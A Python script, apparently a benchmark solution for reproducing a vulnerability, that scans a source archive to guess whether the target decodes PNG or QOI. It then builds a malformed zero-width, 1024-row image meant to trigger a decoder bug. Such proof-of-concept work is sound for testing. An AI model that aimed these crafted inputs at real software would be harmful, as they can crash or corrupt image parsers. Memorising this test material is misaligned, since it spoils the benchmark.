import os
import tarfile
import struct
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = None
        try:
            fmt = self._detect_format(src_path)
        except Exception:
            fmt = None
        if fmt == 'qoi':
            return self._gen_qoi_zero_dim()
        return self._gen_png_zero_dim()

    def _detect_format(self, src_path: str) -> str:
        scores = {'png': 0, 'qoi': 0}
        try:
            tf = tarfile.open(src_path, 'r:*')
        except Exception:
            return 'png'
        try:
            for m in tf.getmembers():
                name = m.name.lower()
                base = os.path.basename(name)

                if name.endswith('.png'):
                    scores['png'] += 2

                if 'libpng' in name or 'lodepng' in name or 'spng' in name:
                    scores['png'] += 5

                if base in ('png.c', 'png.h', 'lodepng.c', 'lodepng.h', 'spng.c', 'spng.h'):
                    scores['png'] += 5

                if 'qoi' in base and (base.endswith('.c') or base.endswith('.h')):
                    scores['qoi'] += 5

                if '/qoi/' in name:
                    scores['qoi'] += 3

                if not (name.endswith('.c') or name.endswith('.cc') or name.endswith('.cpp') or name.endswith('.h')):
                    continue
                if m.size <= 0 or m.size > 200000:
                    continue

                try:
                    f = tf.extractfile(m)
                except Exception:
                    continue
                if f is None:
                    continue
                try:
                    snippet = f.read(4096)
                finally:
                    f.close()

                lower = snippet.lower()
                if b'libpng' in lower or b'lodepng' in lower or b'spng_' in lower or b'png_' in lower:
                    scores['png'] += 10
                if b'qoif' in lower or b'qoi_' in lower:
                    scores['qoi'] += 10
        finally:
            try:
                tf.close()
            except Exception:
                pass

        if scores['qoi'] > scores['png'] + 3:
            return 'qoi'
        return 'png'

    def _make_png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack(">I", len(data))
        crc_val = zlib.crc32(chunk_type)
        crc_val = zlib.crc32(data, crc_val) & 0xFFFFFFFF
        crc = struct.pack(">I", crc_val)
        return length + chunk_type + data + crc

    def _gen_png_zero_dim(self) -> bytes:
        # PNG with zero width and non-zero height.
        width = 0
        height = 1024  # large enough to amplify the effect
        bit_depth = 8
        color_type = 2  # truecolor
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression,
            filter_method,
            interlace,
        )
        ihdr_chunk = self._make_png_chunk(b'IHDR', ihdr_data)

        # For width=0, each scanline is just a filter byte (no pixels).
        raw_scanlines = b'\x00' * height
        compressed = zlib.compress(raw_scanlines)
        idat_chunk = self._make_png_chunk(b'IDAT', compressed)

        iend_chunk = self._make_png_chunk(b'IEND', b'')

        signature = b'\x89PNG\r\n\x1a\n'
        return signature + ihdr_chunk + idat_chunk + iend_chunk

    def _gen_qoi_zero_dim(self) -> bytes:
        # QOI image with zero width and non-zero height.
        magic = b'qoif'
        width = 0
        height = 1024
        channels = 4
        colorspace = 0
        header = magic + struct.pack(">II", width, height) + bytes([channels, colorspace])

        # QOI end marker
        end_marker = b'\x00\x00\x00\x00\x00\x00\x00\x01'
        return header + end_marker
